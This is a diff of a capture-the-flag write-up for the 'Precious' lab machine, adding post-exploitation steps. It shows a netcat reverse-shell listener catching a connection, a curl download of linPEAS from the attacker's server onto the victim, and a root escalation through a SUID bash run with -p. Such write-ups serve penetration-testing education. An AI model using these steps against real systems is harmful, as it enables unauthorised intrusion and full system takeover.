@@ -4,7 +4,7 @@
 
 ![Precious](imgs/machine.png)
 
-Completed on ??/??/20??
+Completed on 26 Jan 2023
 <!-- /Description -->
 
 ## Table of Contents
@@ -19,6 +19,7 @@ Completed on ??/??/20??
     - [Exploitation](#exploitation)
       - [Ruby PDFKit Command Injection](#ruby-pdfkit-command-injection)
     - [Post Exploitation](#post-exploitation)
+      - [Admin's Fatal Error](#admins-fatal-error)
 
 <!-- /TOC -->
 
@@ -157,6 +158,7 @@ We then setup our listener on port 4242 and send the payload to the server..
 $ nc -lvnp 4242
 listening on [any] 4242 ...
 connect to [10.10.14.116] from (UNKNOWN) [10.10.11.189] 52102
+
 ls
 app
 config
@@ -165,10 +167,42 @@ Gemfile
 Gemfile.lock
 pdf
 public
+
+whoami
+ruby
 ```
 
 And we are in!!
 
 ### Post Exploitation
+#### Admin's Fatal Error
+Final step of the exploit is to try and get root access to the machine. A nice way to start is to run an automated script that searches for ways to escalate privileges on Linus machines. One handy tool that does so is [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) which is a shell script that runs multiple checks on the system and tries to find any interesting paths to try. Now, since the victim machine has no internet access, we have to download the script to our local machine first then set up a local server so we can receive it in the victim machine.
+
+```bash
+curl http://10.10.14.116:8000/linpeas.sh -o linpeas.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+ 10  808k   10 86125    0     0  60353      0  0:00:13  0:00:01  0:00:12 60311
+100  808k  100  808k    0     0  69460      0  0:00:11  0:00:11 --:--:-- 70569
+
+ls
+linpeas.sh
+```
+Running the script outputs plenty of information about the machine. Going through all the info, we found something very interesting
+
+![Precious](imgs/linpeas.png)
+
+Apparently the administrator had set the SUID bit to the file /usr/bin/bash which is owned by root.
+This would actually allow us to run it and get a shell with root priveleges.
+```bash
+whoami
+ruby
+/usr/bin/bash -p
+whoami
+root
+```
+The -p flag is used here to indicate that we are running the file with elevated privileges. So just like that we were able to get root access on the machine. We can now get the flags from /home/henry and /root directories and finish the machine :D
 
 ---
+
+> Any feedback would be appreciated. Thank you !
